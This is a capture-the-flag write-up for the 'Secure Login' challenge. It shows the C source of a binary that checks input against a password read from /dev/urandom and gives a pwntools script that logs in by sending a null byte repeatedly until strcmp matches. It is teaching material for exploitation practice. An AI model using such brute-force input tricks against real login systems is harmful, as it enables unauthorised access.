# Secure Login

My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).

Try to hack me at /problems/2021/secure_login on the shell server.

Author: kmh

## Challenge

We are given a binary which checks user input against a randomly generated password.
If `strcmp` returns 0, we are given the flag.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source code

```c
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
```

## Solution

It is not practical to guess the 128 bytes from `/dev/urandom`.
However, `strcmp` stops when it reaches a null byte, as C strings are null-terminated.

As `/dev/urandom` can contain null bytes, there is a 1/256 chance of getting a passcode with a null byte as the first character.
By trying passcodes which also begin with a null byte, we have a 1/256 chance of succeeding on any attempt.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 22 --user USERNAME --pass PASSWORD --path /problems/2021/secure_login/login
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('login')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 22)
user = args.USER or 'USERNAME'
password = args.PASSWORD or 'PASSWORD'
remote_path = '/problems/2021/secure_login/login'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw, cwd = '/problems/2021/secure_login/')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

win = False

while not win:
    io = start()
    io.recvuntil('!\n')
    io.sendline('\x00')
    res = io.recvline().decode()
    if "Wrong" not in res:
        win = True
        print(res)
    io.close()

io.interactive()
```

## Flag

`actf{if_youre_reading_this_ive_been_hacked}`

